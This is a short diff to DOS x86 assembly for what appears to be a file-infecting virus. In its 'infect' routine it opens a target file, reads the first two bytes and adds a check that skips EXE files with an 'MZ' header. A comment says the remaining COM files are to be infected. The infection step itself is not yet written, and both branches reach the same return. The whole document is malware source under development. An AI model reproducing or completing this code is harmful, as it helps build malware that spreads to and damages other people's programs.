@@ -73,14 +73,21 @@ infect:            ; DS:DX = ASCIIZ Filename pointer
      push bx
      xor cx, cx
      xor dx, dx    ; low order and high order = 0
-     mov ax, 4200h ; Move file pointer
+     mov ax, 4200h ; Move file pointer to begining of file
      int 21h
      pop bx
      push bx          ; BX = File Handle
      mov ax, 3f00h    ; Read file or device
      mov cx, 2        ; Read 2 bytes, this case from the start to check wheter it's a COM file or an MZ Executable
      mov dx, data_section.MZ_BUF+bp  ; Pointer to the MZ buffer
-     int 21h          ; Callin int 21h
+     int 21h          ; Calling int 21h
+     cmp word [data_section.MZ_BUF+bp], 'MZ'  ; Is it a MZ file?
+     je .abort_infection
+
+                 ; Since we have now determined that the program in question is not an EXE file, but a COM file instead, we will infect it
+
+.abort_infection:
+     ret
         
 data_section:
      .save_bp dw 0
